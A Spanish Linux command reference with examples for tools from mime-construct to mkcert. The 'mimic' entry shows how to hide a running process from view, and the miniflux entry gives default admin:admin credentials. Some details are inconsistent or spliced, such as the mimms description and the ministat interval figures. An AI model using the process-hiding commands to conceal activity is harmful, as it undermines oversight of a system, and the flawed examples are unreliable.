$ mime-construct --to "destinatario@ejemplo.com" --from yo@ejemplo.com --subject "Prueba de correo" --body "Hola, este es un mensaje de prueba." (enviar un correo simple con texto plano. El correo se envía
usando el servidor de correo configurado en el sistema)
$ mime-construct --to "destinatario@ejemplo.com" --subject "Documento importante" --multipart mixed --body "Adjunto encontrarás el documento." --file documento.pdf (enviar con un PDF adjunto)
$ mime-construct --to "destinatario@ejemplo.com" --subject "Correo en HTML" --type text/html --body "<h1>Hola</h1><p>Este es un mensaje en <b>HTML</b>.</p>" (enviar un correo con texto HTML)
$ mime-construct --to "destinatario@ejemplo.com" --subject "Correo de prueba" --body "Mensaje de prueba" --output > mensaje.mime (crear mensaje MIME y guardarlo en un archivo sin enviarlo)
$ mime-construct --to "destinatario@ejemplo.com" --subject "Archivos adjuntos" --multipart mixed --body "Aquí tienes los archivos solicitados." --file imagen.jpg --file informe.pdf (enviar un correo con varios adjuntos)
       --to --> Define el destinatario.
       --subject --> Especifica el asunto.
       --body --> Contenido del mensaje en texto plano o código HTML.
       --multipart mixed --> Crea un mensaje con varias partes [texto y adjunto].
       --file --> Adjunta el archivo documento.pdf.
       --type text/html --> Indica que el cuerpo es HTML [text/plain...].
       --output --> Evita enviar el correo y muestra el mensaje MIME en la salida estándar.
       --header --> Añade un encabezado personalizado al mensaje MIME.
       --from <dirección> --> Remitente.
       --cc <dirección> --> Copia [CC].


ministat
Calcula las propiedades estadísticas fundamentales de uno o dos conjuntos de datos numéricos y determina si se puede encontrar una diferencia entre ambos con un nivel de confianza determinado.
Obtener estadísticas de un solo conjunto de datos
$ nano tiempos_v1.txt
10.2
9.8
10.5
10.1
9.9
11.0
$ ministat tiempos_v1.txt
...
    N        Min        Max      Median      Avg    StdDev
x   6       9.80      11.00      10.15     10.25      0.44
Primero muestra el gráfico ASCII [diagrama de caja simplificado] de la distribución y a continuación muestra las estadísticas básicas: número de muestras [N], mínimo [Min], máximo [Max], mediana [Median], promedio [Avg] y desviación estándar [StdDev].
Comparar con un segundo archivo
$ nano tiempos_V2.txt
9.5
9.1
9.3
9.2
9.0
9.4
$ ministat tiempos_v1.txt tiempos_v2.txt
...
x   6           9.8            11          10.2         10.25    0.44158804
+   6             9           9.5           9.3          9.25    0.18708287
Difference at 95.0% confidence
	-1 +/- 0.436218
	-9.7561% +/- 4.25578%
	(Student's t, pooled s = 0.339116)
Muestra la distribución de ambos conjuntos en el mismo gráfico ASCII, las estadísticas básicas para cada conjunto y la diferencia. En este ejemplo, el promedio de $V2$ (9.25) es -1.00 menos que el promedio de $V1$ (10.25). La línea "Difference at 95.0% confidence" indica que la diferencia real se encuentra entre -1.00 - 0.4023 y -1.00 + 0.4023. Como este rango no incluye el cero, se concluye que hay una diferencia estadísticamente significativa al 95% de confianza. Si el rango hubiese incluido el cero, ministat diría "No difference proven at 95.0% confidence".
$ ministat -A tiempos_v1.txt tiempos_v2.txt (para omitir el gráfico y solo mostrar las estadísticas y la comparación)
$ ministat -c 99 tiempos_v1.txt tiempos_v2.txt (cambiar el nivel de confianza para la Prueba t de Student [ej. 99%])


mimetype
Determina el tipo de archivo.
$ mimetype -a archivo.md
$ mimetype -M archivo.sh (No verificar por la extension, solo por el contenido del archivo)


mimic
Herramienta de ejecución encubierta. La ejecución encubierta es el arte de ocultar de la vista a un proceso.
$ mimic -e "script.sh"
$ mimic -b -e "./script.sh" (en background)


mimms
Grabación de emisoras.mencoder mf://*.jpg -ovc lavc -o out.avi
$ mimms -t 2 mms://viplagardere.yacast.net/encodereurope2 (2 minutos)


mina
Herramienta de automatización de despliegue [deployment] como clonar repositorios, instalar dependencias, reiniciar servicios, etc. escrita en Ruby y diseñada para simplificar y agilizar la implementación de aplicaciones en servidores remotos. Su principal característica es que genera scripts Bash a partir de tareas definidas en Ruby, y luego ejecuta esos scripts en el servidor remoto a través de una única sesión SSH, lo que optimiza el rendimiento y reduce la sobrecarga de múltiples conexiones SSH.
Crear un archivo en el directorio del proyecto donde se define la configuración básica y las tareas de despliegue. Un ejemplo mínimo:
$ nano config/deploy.rb
      require 'mina/bundler'
      require 'mina/rails'
      require 'mina/git'
      set :domain, 'tuservidor.com'
      set :deploy_to, '/var/www/mi_app'
      set :repository, 'git@github.com:usuario/mi_app.git'
      set :branch, 'main'
      task :setup do
        command %[mkdir -p "#{deploy_to}/shared/log"]
	command %[mkdir -p "#{deploy_to}/shared/config"]
	command %[touch "#{deploy_to}/shared/config/database.yml"]
      end
      task :deploy do
        deploy do
	  invoke :'git:clone'
	  invoke :'deploy:link_shared_paths'
    	  invoke :'bundle:install'
    	  invoke :'rails:db_migrate'
    	  invoke :'rails:assets_precompile'
    	  invoke :'deploy:cleanup'
    	  to :launch do
	        invoke :'puma:restart'
	    end
	  end
       end
$ mina setup (onfigurar el servidor por primera vez)
$ mina deploy (desplegar tareas)
1.-
Ejemplo de tareas personalizadas
Definir tus propias tareas. Por ejemplo, para reiniciar un servicio de Nginx:
	task :restart_nginx do
	  command %[sudo systemctl restart nginx]
	end
Y luego invocarla desde otra tarea:
        task :deploy do
	  deploy do
	      # ... otras tareas ...
	      invoke :restart_nginx
	  end
	end


minfo
Herramienta que imprime los parámetros de un sistema de archivos MS-DOS, como el número de sectores, cabezas y cilindros. También imprime una línea de comandos mformat que puede utilizarse para crear un sistema de archivos MS-DOS similar en otro soporte.


mingetty
[Modern Getty]. Versión minimalista y optimizada del programa "getty", diseñada específicamente para consolas virtuales locales, como las terminales accesibles con "Ctrl+Alt+F1-F6", no funciona con terminales físicas [seriales] ni redes [SSH]. Getty abre un puerto tty, solicita un nombre de usuario e invoca el comando /bin/login.
# mingetty /dev/tty4 (abrirá la terminal tty4, accesible con "Ctrl+Alt+F4", donde se pedirá un nombre de usuario)
Nota.- En sistemas actuales, mingetty está integrado en el servicio getty@.service. Para habilitarlo en tty3, caso improbable de que no lo esté por "systemd-logind":
# systemctl enable getty@tty3.service


minidjvu
Herramienta para trabajar con el formato DjVu, centrándose en imágenes monocromas [blanco y negro] y diseñada para archivos multipágina, como documentos escaneados. Permite convertir imágenes en varios formatos [PBM, BMP, TIFF] a DjVu y viceversa, pero sin soporte para color ni escala de grises, lo que la hace especialmente útil para documentos de texto escaneados.
$ minidjvu input.pbm output.djvu (Convierte una imagen monocroma PBM al formato DjVu)
$ minidjvu page1.pbm page2.pbm page3.pbm output.djvu (crea un archivo DjVu multipágina, uniendo las imágenes PBM indicadas)
$ minidjvu --deco input.djvu output.pbm (extrae la primera página del archivo DjVu y la guarda como archivo PBM)
$ minidjvu --deco --pages input.djvu page%d.pbm (decodifica todas las páginas de input.djvu, guardando cada página como archivos page1.pbm, page2.pbm, etc)


minicoredumper
Es un servicio que captura volcados de memoria de forma selectiva y configurable, más ligero que el core dump tradicional del sistema.
# systemctl status minicoredumper (ver estado del servicio)
# minicoredumper --pid 1234 (forzar un volcado manual de un proceso específico)
Un ejemplo de configuración:
# nano /etc/minicoredumper.conf
       # Configurar para capturar solo ciertos tipos de señales
       # En el archivo de configuración:
       # signal = SIGSEGV,SIGABRT,SIGFPE
       [core]
       # Directorio donde guardar los volcados
       directory = /var/crash
       #
       # Tamaño máximo del volcado
       max_size = 100M
       #
       # Señales que activarán el volcado
       signal = SIGSEGV,SIGABRT
       #
       # Comprimir volcados
       compress = yes


minicoredumper-utils
Herramientas para trabajar con aplicaciones basadas en libminicoredumper: coreinject y minicoredumper_trigger. Ver minicoredumper y gdb.
# coreinject --env /path/to/core.dump (inyectar información adicional en archivos de volcado existentes en ese caso en las variables de entorno)
# coreinject --maps /path/to/core.dump (inyectar información de archivos mapeados en memoria)
# coreinject --env --maps --auxv /path/to/core.dump (inyectar múltiples tipos de información)
# coreinject --env core.dump -o core_with_env.dump (especificar archivo de salida)
# minicoredumper_trigger --pid 5678 (generar volcado de un proceso por PID)
# minicoredumper_trigger --name mi_aplicacion (generar volcado de un proceso por nombre)
# minicoredumper_trigger --pid 5678 --with-maps --with-env (generar volcado con información específica)
# minicoredumper_trigger --pid 5678 --force (forzar volcado incluso si el proceso está funcionando correctamente)
Nota.- Un core dump es un archivo binario que contiene el estado de la memoria de un proceso en el momento de un fallo


minidlna
MiniDLNA es un servidor de medios ligero que implementa los protocolos DLNA [Digital Living Network Alliance] y UPnP-AV [Universal Plug and Play - Audio Video]. Permite compartir archivos multimedia de música, imágenes y videos en una red local para que dispositivos compatibles puedan acceder a ellos tales como Smart TVs [Samsung, LG, Sony, etc.], consolas [PlayStation, Xbox], reproductores multimedia [Kodi, VLC], dispositivos móviles y aplicaciones como BubbleUPnP.
Configuración mínima:
# nano /etc/minidlna.conf
       # Directorio donde se almacenan los archivos de la base de datos
       db_dir=/var/cache/minidlna
       # Directorio de log
       log_dir=/var/log
       # Puerto HTTP (por defecto 8200)
       port=8200
       # Nombre del servidor en la red
       friendly_name=Mi Servidor Multimedia
       # Directorios a compartir (separados por comas)
       media_dir=A,/home/usuario/Música
       media_dir=P,/home/usuario/Imágenes
       media_dir=V,/home/usuario/Videos
       # Configuración de red
       network_interface=eth0
       presentation_url=http://192.168.1.100:8200
       # Opciones de rendimiento
       max_connections=10
       root_container=.
# systemctl enable minidlna (habilitar inicio automático)
# minidlna -R (forzar rescaneo de archivos)
# tail -f /var/log/minidlna.log (ver logs en tiempo real)
# grep -i error /var/log/minidlna.log (ver logs de errores)
# minidlna -d -S (probar configuración sin iniciar el servicio)
# netstat -tlnp | grep 8200 (verificar que el servicio está escuchando)
1.-
Regenerar base de datos completa:
# systemctl stop minidlna
# rm -rf /var/cache/minidlna/*
# systemctl start minidlna


minify
Herramienta basada en el paquete de biblioteca GO y su propósito es reducir el tamaño de archivos web: HTML, CSS, JavaScript, JSON, SVG, XML, eliminando bytes innecesarios, como espacios en blanco, comentarios o caracteres redundantes, sin alterar la funcionalidad o la salida del archivo. Esto optimiza la transmisión por internet y puede mejorar los tiempos de carga y análisis en aplicaciones web.
$ minify -l (lListar todos los tipos de archivos aceptados)
$ minify -r -o web-min web (minificar un directorio recursivamente)
1.-
Ejemplo de minificar un archivo CSS
$ nano styles.css
       css:disable-run
       /* Estilo principal */
       body {
           margin: 10px;
	   padding:  20px;
       }
$ minify -o styles.min.css styles.css (minificar styles.css y guardar el resultado en styles.min.css)
$ cat styles.min.css
      css:disable-run body{margin:10px;padding:20px}
2.-
Ejemplo de minificar un archivo JavaScript
$ nano script.js
       // Esto es un comentario
       function greet() {
           console.log(  "Hola, mundo!"  );
       }
$ minify -o script.min.js script.js
$ cat script.min.js
     function greet(){console.log("Hola, mundo!")}
Nota.- La minificación puede romper archivos mal formados. Comprobar que los archivos sean válidos antes de minificarlos.


miniflux
[libreadline-dev libconfig-dev libssl-dev lua5.2 liblua5.2-dev libevent-dev libjansson-dev libpython-dev make]. Lector RSS instalado en local o en un servidor. Simplemente se descarga la aplicación de <http://miniflux.net/> y, una vez descomprimida, se copia al directorio web (generalmente /var/www). Se accede colocando en la barra de direcciones: http://localhost/miniflux (Por defecto el nombre de usuario y contraseña son admin:admin)
Atajos de teclado:
	gu (Ir a leídas)
	gb (Ir a marcadores)
	gh (Ir al historial)
	gs (Ir a suscripciones)
	gp (Ir a preferencias)
	s (Descargar contenido)
	p (Noticia anterior)
	n (Noticia siguiente)
	m (Marcar como leido)
	v (Abrir la noticia original)
	o (Desplegar la noticia)
	f (Añadir a favoritos)
	h (Ir a página precedente)
	l (Ir a página anterior)
	? (Abrir la ayuda de los atajos de teclado)
	q (Cerrar la ayuda)


minilla
Herramienta para la creación, prueba, publicación, instalación y carga de distribuciones CPAN, pensada para simplificar el ciclo de vida de un módulo Perl: desde su creación hasta su liberación en CPAN [Comprehensive Perl Archive Network]. CPAN es una red de almacenamiento de recursos de Perl a la que se tiene acceso a través de http://www.cpan.org/ y en la que se pueden realizar búsquedas desde http://search.cpan.org/.
$ perl -MCGI::Carp -e 1 (si no da menaje de error es que ya está instalado)
$ perl -e "print qq(@INC)" (ruta del módulo)
$ minil test (probar el módulo)
$ minil install (construir e instalar localmente)
$ minil release (preparar y liberar)
$ minil upload (subir a CPAN. Requiere tener configuradas las credenciales)
1.-
Ejemplo para empezar un módulo Perl
$ minil new Mi-Modulo (creará un directorio Mi-Modulo/ con la estructura estándar de un módulo CPAN)
$ cd Mi-Modulo


minilzip
Es una versión reducida del compresor de datos lzip, casi tan rápido como gzip y comprime mejor que bzip2 y totalmente compatible con lzip. LZMA [Lempel-Ziv-Markov chain-Algorithm]
$ minilzip -k -o comprimido.lz archivo.txt (conservar los archivos de entrada, escribir la salida con el nombre "comprimido.lz" y archivo.txt es el archivo a comprimir)
$ minilzip -t comprimido.lz (comprobar la integridad del archivo comprimido)
$ minilzip --best archivo.txt (con la máxima compresión. Del 0 al 9. "best" es un alias para 9 y "fast" para 0. Predeterminado 6)
$ minilzip -d comprimido.lz (descomprimir)


minimodem
Es esencialmente un módem de software. En lugar de usar hardware físico para modular [convertir datos digitales en tonos de audio] y demodular [convertir tonos de audio en datos digitales], lo hace mediante la tarjeta de sonido de la computadora. Es compatible con diversos protocolos FSK estándar, como Bell103, Bell202, RTTY, TTY/TDD, NOAA SAME e identificador de llamadas.
$ echo "Mensaje secreto para un archivo." | minimodem -t -f mensaje_secreto.wav 1200 (el transmisor crea el archivo de audio con los tonos del mensaje que puede enviarse por email)
$ minimodem -r -f mensaje_secreto.wav 1200 (decodificar el archivo de audio por parte del receptor)
$ cat mi_documento.txt | minimodem -t -f mi_archivo.wav 300 (transmitir archivos)
$ minimodem -r -f mi_archivo.wav 300 > documento_recibido.txt (descodificarlo el receptor)
$ echo "CQ CQ CQ Este es un llamado general por radio." | minimodem -t rtty (usando un protocolo clásico de radio que usa 7 bits de datos y paridad par)
$ minimodem -r rtty (decodificar en recepción)
$ minimodem --rx -S 1000 -A 10 300 (con recepción ruidosa, fuerza la sincronización cada 1000 ms y ajusta automáticamente el nivel de audio para adaptarse a señales silenciosas o fuertes)
1.-
Un caso práctico. Dos computadoras, o una con dos terminales abiertos. En el equipo TRANSMISOR con altavoz:
$ echo "Hola desde Minimodem!" | minimodem -t 300
Hará que el altavoz emita una serie de tonos que representan el texto "Hola desde Minimodem!" a 300 baudios.
En el equipo RECEPTOR con micrófono. La velocidad en Baudios ha de ser la misma que el transmisor:
$ minimodem -r 300
Acercando el micrófono del receptor al altavoz del transmisor se verá cómo minimodem decodifica los tonos en tiempo real y muestra el mensaje original en la pantalla.
Nota.- A menor velocidad [300 baudios], mayor es la resistencia al ruido, pero la transferencia es más lenta. A mayor velocidad [9600 baudios], es más rápida pero requiere un canal de audio de muy alta calidad, sin eco, sin ruido.


mininet
Herramienta que permite crear y experimentar con redes virtuales en una sola máquina, simulando switches, hosts y enlaces tal como existen en una red física. Es ideal para probar conceptos de redes definidas por software [SDN] con OpenFlow. Incluye el ejecutable mnexec que se usa internamente para gestionar los procesos de los hosts virtuales, normalmente no se usa directamente.
# mn (crea una red de un switch [s1] y dos hosts conectados [h1, h2], un controlador y sinalmente se entra en una CLI interactiva)
     mininet> help (ayuda para con comando disponibles)
     mininet> nodes (lista todos los nodos: hosts, switches y controlador)
     mininet> net (muestra cómo están conectados los nodos)
     mininet> dump (muestra detalles de los nodos y sus interfaces)
     mininet> xterm h1 (abre una terminal de sistema aislada para el host h1. Precisa xterm instalado)
     mininet> pingall (efectua un ping entre todos los hosts de la red)
     mininet> exit (salir de mininet)
     mininet> h1 ifconfig (ejecutar comands de red dentro del host virtual h1)
     mininet> h2 ping h1 (ejecutar un ping entre dos máquinas del host)
# mn --topo=tree,2,2 (crea un árbol de switches y hosts según esos valores)
# mn --topo=linear,3,2 (topología lineal con 3 switches y 2 hosts por switch)
# mn --topo=single,3 (topología de un switch y 3 hosts)
# mn -c (limpia registros y elimina toda la red virtual anterior)


miniramfs
Conjunto de scripts y herramientas, cuyo propósito es generar imágenes de initramfs [Initial RAM File System] de tamaño reducido. Esto es crucial para sistemas o dispositivos con restricciones significativas de memoria o espacio de almacenamiento para la imagen de arranque, como puede ser hardware embebido o sistemas que arrancan por red [PXE]. El concepto principal es el de crear un initramfs minimalista que solo contenga los módulos del kernel y las herramientas esenciales, como mkfs, mount, o udev mínimo, necesarios para: Detectar y cargar el controlador del disco o la red, montar el sistema de archivos raíz real y transferir el control al sistema de archivos raíz para continuar con el arranque normal.
# miniramfs-generator -k <versión_del_kernel> -o /boot/miniramfs-<versión>.img (especifica para qué versión del kernel se debe construir la imagen y  donde guardarla)
El script analizaría la configuración del kernel*y el hardware para incluir solamente los módulos de controlador para el disco de arranque [ej: SATA, NVMe, o el controlador de red si es un arranque remoto] y programas muy básicos como busybox, una herramienta que combina muchas utilidades estándar de Linux en un solo ejecutable pequeño, en lugar de versiones completas de bash, mount, etc. Una vez generada la imagen, el paso final es decirle al gestor de arranque [como GRUB] que use esta imagen minimalista en lugar de la imagen de initramfs estándar.
# update-grub
Nota.- initramfs es un sistema de archivos temporal utilizado durante el arranque de Linux.


minisapserver
Herramienta del proyecto VideoLAN que permite generar y enviar anuncios de sesiones multimedia usando el Session Announcement Protocol [SAP]. Estos anuncios se envían en formato Session Description Protocol [SDP], que es un estándar para describir sesiones de streaming de multimedia como audio o video, en una red.
$ minisapserver -a 239.255.12.34 -p 1234 -n "Mi Stream de Prueba" (anunciar un stream de video en la dirección 239.255.12.34 [multicast] en el puerto 1234)
$ minisapserver -a 239.255.12.34 -p 1234 -n "Stream H.264" -i "Stream prueba en H.264" -m video -c "H264/90000" (añadir más información [-i] al anuncio, tipo de medio [-m[ y el codec [-c])
$ minisapserver -f mi_sesion.sdp (anunciar una sesión con varios streams e audio y video)
Un ejemplo de contenido del archivo .sdp
$ nano mi_sesion.sdp
       v=0
       o=- 0 0 IN IP4 192.168.1.1
       s=Mi Sesión Multimedia
       c=IN IP4 239.255.12.34/127
       t=0 0
       m=video 1234 RTP/AVP 96
       a=rtpmap:96 H264/90000
       m=audio 1236 RTP/AVP 97
       a=rtpmap:97 MP4A-LATM/44100/2
$ minisapserver -a 239.255.12.34 -p 1234 -n "Stream" -s 224.2.127.255 (por defecto, envía los anuncios a la dirección multicast de SAP [224.2.127.254], cambiarla a la ss4.2.127.255)


minisat
Solucionador SAT rápido y ligero. A pesar de la completitud NP del problema de satisfacibilidad de fórmulas booleanas (SAT), los solucionadores SAT suelen ser capaces de resolver este problema en un plazo razonable. Un solucionador es un programa o algoritmo que, dado un problema específico, busca encontrar una solución que cumpla ciertas condiciones. En el contexto de la informática y la lógica, un solucionador toma una fórmula o conjunto de restricciones y determina si existe una asignación de valores o variables booleanas que hagan verdadera una fórmula lógica. Un ejemplo de uso:
$ nano formula.cnf
       p cnf 3 2
       1 -2 0
       2 3 0
p cnf 3 2 --> indica que hay 3 variables y 2 cláusulas.
La primera cláusula --> 1 -2 0 (x1 OR NOT x2)
La segunda cláusula --> 2 3 0` (x2 OR x3)
$ minisat formula.cnf resultado.out (ejecutar)
La pantalla mostrar un salida amplia pero el archivo resultado.out:
       SAT
       1 -2 3 0


minisign
Herramienta para firmar archivos y verificar firmas que utiliza el sistema de firma de clave pública Ed25519 de alta seguridad. Los archivos de firma incluyen una línea de comentario no confiable que se puede modificar libremente, incluso después de la creación de la firma. También incluyen una segunda línea de comentario que no se puede modificar sin la clave secreta. Los comentarios confiables se pueden usar para agregar instrucciones o metadatos específicos de la aplicación como nombre de archivo, marcas de tiempo, identificadores de recursos, números de versión para evitar ataques de degradación.
$ minisign -G -p pubkey.txt -s secretkey.txt (genera una clave pública para verificación [pubkey.txt] y una clave privada para firmar [secretkey.txt])
$ minisign -S -s secretkey.txt -m archivo.txt (pedirá la contraseña ntrada en el paso anterior y creará archivo.txt.minisig con la firma de archivo.txt)
$ minisign -S -s secretkey.txt -m mensaje.txt -c "Versión 1.0 - Oct 2025" (lo mismo con un comantario)
$ minisign -Vm mensaje.txt -p pubkey.txt (verificar si la firma ha sido modificada)
  	   Signature and comment signature verified
Si ha sido modificad aparecerá:
           Signature verification failed
El contenido de un archivo .minisig muestra las lineas:
   	  untrusted comment: signature from minisign secret key
	  RURUqkuAKIaHUbQJEU4lV/hT3JT0L7E9roUhS7OCfYrB8HhVuH...
	  trusted comment: timestamp:1759929273   file:archivo.txt      hashed
	  zDADSXsqVWH9Hqxo1IF08s6f5uqHWgJ5SBMZnbUMw0WsoXsK...
untrusted comment --> editable, no afecta la verificación.
trusted comment --> autenticado con la firma.
Última línea --> la firma en base64.


minissdpd
Es un pequeño demonio utilizado por MiniUPnc y su función principal es acelerar la detección de dispositivos UPnP en la red, guardar en la memoria los que se anunciaron en la red mediante paquetes SSDP NOTIFY y gestionar el tráfico SSDP [Simple Service Discovery Protocol] enviados por los dispositivos en la red y recibidos en el equipo. El archivo de configuración se encuentra en /etc/default/minissdpd. El puerto multicast por defecto es el 1900, que puede cambiarse en el archivo de configuración:
      MINISSDPD_MCAST_PORT=12345
# systemctl enable minissdpd (habilitar el arranque automático)
# cat /var/log/minissdpd.log | grep "Device found" (verificar los dispositivos detectados)
# minissdpd --clear-cache (limpiar la lista de dispositivos guardados)
Notas.- UPnP: Stands for Universal Plug and Play. Es un protocolo que permite a los dispositivos conectarse automáticamente en redes domésticas o empresariales sin necesidad de configuración manual. IGD: Stands for Internet Gateway Device. Es un dispositivo que actúa como puente entre la red local y la red externa, generalmente un router. SSDP: Simple Service Discovery Protocol. Es un protocolo que permite a los dispositivos descubrir otros dispositivos en la misma red.


minizip
Biblioteca que permite comprimir, extraer, visualizar y manipular archivos .zip. Este paquete incluye las herramientas minizip y miniunzip.
$ minizip -o -9 archivo.zip archivo.txt archivo2.txt (comprimir lento pero mejor [-1 = rapido pero peor] los archivos .txt especificados en archivo.zip, sobreescribiento si existe [-o])
$ minizip -a archivo.zip archivo.md (añadir archivo.md al .zip existente)
$ miniunzip -l archivo.zip (listar los archivos del interior de un .zip)
$ miniunzip -o -x arxius.zip (extraer sobreescribiendo si existen)


mirmon
Comprueba el estado de los espejos de Debian. Visualizarlos en el navegador con la ruta: /var/lib/mirmon/debian-mirror-check.html. El archivo de configuración en /etc/mirmon.conf.
# mirmon -v -get update (Actualizar estado de los mirrors con la maxima información)
# mirmon -v -get url http://ftp.es.debian.org/debian/ (sondear la url de un mirror)


miscfiles
Conjunto de archivos no cruciales para la administración u operación del sistema, pero se han vuelto comunes en varios sistemas a lo largo de los años. Se originaron de varias fuentes y son libremente redistribuibles (consulte el archivo de copyright para obtener más información). Hacen referencia principalmente a temas ingleses como: Lista de códigos de tres letras para algunos de los principales aeropuertos, códigos de área telefónica de América del Norte), códigos postales para estados de EEUU yY provincias canadienses, la constitución de los Estados Unidos de América y la declaración de la independencia de las trece colonias aunque tambien incluyen otros como: tabla de precedencia para operadores en lenguaje C, descripción del conjunto de caracteres ISO Latin-1, códigos de dos letras para idiomas, de ISO 639, códigos telefónicos de países internacionales, coordenadas geográficas de muchas ciudades importantes, algunas abreviaturas comunes utilizadas en la comunicación electrónica, listas de correo GNU, abreviaturas de países y monedas, índice rfc, etc.). Se puede acceder a todo el material con el navegador, a los diccionarios y listados de palabras: file:///usr/share/dict/ y a los documentos: file:///usr/share/doc/miscfiles.
$ gzip -d ascii.gz (descomprimir algún .gz que interese)


mispipe
[moreutils]. mispipe se comporta como cualquier tuberia de la shell, incluyendo comandos independientes, pero a diferencia de las clásicas tuberias, que sólo devuelven el estado de salida del último comando, mispipe devuelve el estado de salida del primer comando si este falla.
$ mispipe ls "echo "NO""


missidentify
Es un programa para encontrar aplicaciones Win32 de MS Windows. De forma predeterminada, muestra el nombre de archivo de cualquier ejecutable sin extensión o ignorándola, como exe, dll, com, sys, cpl, hxs, hxi, olb, rll o tlb y detecta archivos sospechosos que podrían ser malware disfrazado, por ejemplo, un .pdf que en realidad es un .exe.
$ missidentify (mostrará todos los archivos en el directorio actual que sean ejecutables de Windows, sin importar su extensión)
$ missidentify ~/Descargas (mostrará todos los ejecutables de Windows en la carpeta Descargas)
$ missidentify -r ~/Documentos (buscar recursivamente en subdirectorios del directorio especificado)
$ missidentify -b (mostrar solo el nombre del archivo sin la ruta)
$ missidentify | grep "malware" (filtrará los resultados para mostrar solo los archivos que contengan "malware" en su nombre)


mjpegtools
Conjunto de herramientas de captura, edición y reproducción de MJPEG [Motion JPEG] y codificación MPEG. Los programas MJPEG son un conjunto de herramientas que permiten grabar y reproducir vídeos, realizar ediciones sencillas de cortar y pegar, y comprimir audio y vídeo MPEG en Linux. Incluye las aplicaciones jpeg2yuv, lav2avi, lav2mpeg, lav2wav, lav2yuv, lavaddwav, lavinfo, lavpipe, lavplay, lavtrans, mp2enc, mpeg2enc, mpegtra, nscode, mplex, pgmtoy4m, png2yuv, pnmtoy4m, ppmtoy4m, y4mcolorbars, y4mdenoise, y4mscaler, y4mtopnm, y4mtoppm, y4munshar
p, yuv2lav, yuv4mpeg, yuvcorrect, yuvcorrect_tune, yuvdeinterlace, yuvdenoise, yuvfps, yuvinactive, yuvkineco, yuvmedian, yuvplay, yuvscaler, yuvycsnoise
$ lavrec -f 100 video.avi (grabar 100 frames desde /dev/video0)
$ lavrec -d /dev/video0 -s 640x480 video.avi (grabar con resolución específica)
$ lavrec -q 90 video.avi (grabar con calidad JPEG personalizada. La calidad de 1 a 100 máxima calidad)
$ lavplay video.avi (reproducir archivo AVI)
$ lavplay -s 800x600 video.avi (reproducir con tamaño específico)
$ lav2yuv video.avi > video.yuv (convertir AVI a YUV raw)
$ lav2yuv -f 50 video.avi > video.yuv (extraer solo primeros 50 frames)
$ jpeg2yuv -I p -f 25 -j imagen%03d.jpg > video.yuv (convertir secuencia de JPEGs a YUV. -I p = progresivo, -I t = entrelazado)
$ jpeg2yuv -f 30 -j fotos_*.jpg > video.yuv (con frame rate específico)
$ yuv2lav video.yuv -o video.avi -f 25 (convertir YUV a AVI)
$ yuv2lav -s 640x480 video.yuv -o video.avi (especificar resolución)
$ yuv2lav video.yuv | mpeg2enc -o video.m1v (codificar YUV a MPEG-1)
$ mpeg2enc -q 1 -f 4 -o video_dvd.m2v (MPEG-2 con alta calidad)
$ jpeg2yuv -f 25 -I p -j img%03d.jpg | mpeg2enc -f 4 -q 3 -o video.mpg (convertir secuencia JPEG → MPEG)
$ lav2wav video.avi > audio.wav (extraer audio de un vídeo)
$ lavaddwav video_sin_audio.avi audio.wav video_final.avi (combinar audio y vídeo)
$ lav2yuv -f 100-200 video.avi | yuv2lav -o recorte.avi (recortar vídeo. Extraer frames 100-200)


mjpg-streamer
Streaming de video
$ mjpg_streamer -i "input_uvc.so -y -f 5" -o output_http.so -p 3000 -n -c USER:CONTRASEÑA -b
Opciones:
	-f  frames por segundo
	-y  cambiar formato mjpg por yuv (cuando mjpg da problemas)
	-b  background
	-n  liberar terminal (conjuntamente con -b)
	-c  usuario:contraseña
Y en el navegador:
http://localhost:3000/?action=snapshot  (tomar una foto)
http://localhost:3000/?action=stream    (reproducir video)
Matar el proceso con:
$ kill -9 `pidof mjpg_streamer`


mk-build-deps
Cea un paquete que satisfaga las dependencias de compilación de un paquete.
$ mk-build-deps emacs25 (crea una paquete emacs25-build-deps_25.1+1-4+deb9u1_amd64.deb con todas las dependencias de emacs25)
$ mk-build-deps -i emacs25 (lo instala todo)


mk-configure
Herramienta de configuración y construcción portable que actúa como un sustituto ligero de AutoTools, apoyándose en bmake [NetBSD make] y herramientas POSIX como shell y awk para automatizar la generación de Makefiles y scripts de construcción en proyectos de software. Utiliza archivos .mk como módulos reutilizables y un archivo especial llamado "Makaefile" [no "Makefile"] para definir reglas, configuraciones y opciones de construcción. Incluye las aplicaciones mkc_check_compiler, mkc_check_custom, mkc_check_decl, mkc_check_funclib, mkc_check_header, mkc_check_prog, mkc_check_sizeof, mkc_check_version, mkc_compiler_settings, mkc_install, mkc_which y mkcmake.
El ciclo típico de uso, es preparar el árbol de fuentes, incluyendo el archivo "Makaefile" y módulos .mk requeridos.
# mkcmake (genera el makefile a partir del archivo principal [Mkcfile, Makefile.mkc, etc.] ejecutando automáticamente los scripts de detección de entorno)
# bmake (compila)
# bmake install (instala)
# mkc_check_compiler cc (detecta y prueba compiladores disponibles, cc, gcc, clang, etc.)
# mkc_check_custom "int main(){return 0;}"  (ejecuta una prueba arbitraria definida por el usuario)
# mkc_check_decl malloc stdlib.h (comprueba si existe una declaración [símbolo, variable, función, macro] en los headers estándar)
# mkc_check_header (comprueba si existe un archivo de cabecera)
# mkc_check_type size_t stddef.h (comprueba si un tipo [int64_t, size_t, etc] está definido)


mkalias
Permite a los usuarios crear, listar y eliminar alias. Todos los alias se guardan en ~/.bashrc, creando un alias y una función para alias. Todos los nombres de las funciones tienen el prefijo "mkalias" y el alias se añade al final del archivo ~/.bashrc.
$ mkalias new ll 'ls -al' (crear un alias)
$ mkalias list (listar los alias creados con mkalias)
$ mkalias remove lal (eliminarlo)
$ mkalias show (Mostrar los comandos reales de todos los alias)


mkcert
Generar certificados SSL [protocolo seguro HTTPS] firmados localmente.
$ apt install wget curl libnss3-tools
$ mkcert -install (generar el Certificate of Authority [CA])
$ mkcert -CAROOT (localizar donde se guarda el CA)
$ mkcert localhost (generar el certificado para localhost)
El comando anterior genera en el directorio donde se lanza los archivos localhost.pem y localhost-key.pem. A continuación crear el archivo:
# nano /etc/apache2/conf-available/ssl-params.conf
Con el contenido:
    SSLCipherSuite EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH
    SSLProtocol All -SSLv2 -SSLv3 -TLSv1 -TLSv1.1
    SSLHonorCipherOrder On
    # Disable preloading HSTS for now.  You can use the commented out header line that includes
    # the "preload" directive if you understand the implications.
    # Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains; preload"
    Header always set X-Frame-Options DENY
    Header always set X-Content-Type-Options nosniff
    # Requires Apache >= 2.4
    SSLCompression off
